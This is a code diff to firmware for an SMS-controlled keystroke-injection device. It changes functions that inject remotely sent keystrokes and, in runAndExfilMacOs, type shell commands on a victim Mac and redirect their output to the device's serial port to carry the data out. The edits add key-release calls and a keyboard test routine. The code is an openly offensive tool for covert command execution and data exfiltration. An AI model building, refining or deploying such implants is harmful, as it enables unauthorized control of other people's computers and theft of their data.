@@ -107,6 +107,7 @@ void manualPayload(String SMS_text){
   String action = getValue(SMS_text,SEPARATOR,1);
   String argument = getValue(SMS_text,SEPARATOR,2);
   if (action == F("press")){
+    Keyboard.releaseAll();
     // There can be an unlimited number of keystrokes separated by space
     int n_spaces = 0;
     for(int i=0; i<=argument.length() ;i++){
@@ -117,6 +118,7 @@ void manualPayload(String SMS_text){
     for(int i=0; i<=n_spaces ;i++){
         String keystroke = getValue(argument," ",i);
         Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
+        Keyboard.releaseAll();
     }
     Keyboard.releaseAll();
   } else if (action == F("print")){
@@ -551,6 +553,13 @@ void runAndExfilMacOs(String command) {
   Keyboard.print(F(" stty -f /dev/cu.usbmodem* 38400 && "));
   Keyboard.print(command);
   Keyboard.print(F(" > /dev/cu.usbmodem*"));
+  Keyboard.print("\n");
+  delay(3000);
+}
+
+
+void testKeyb() {
+  Keyboard.print(F("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()-_=+[{]};:'\"\\|,<.>/?<>`~ "));
   Keyboard.print("\n");
   delay(3000);
 }
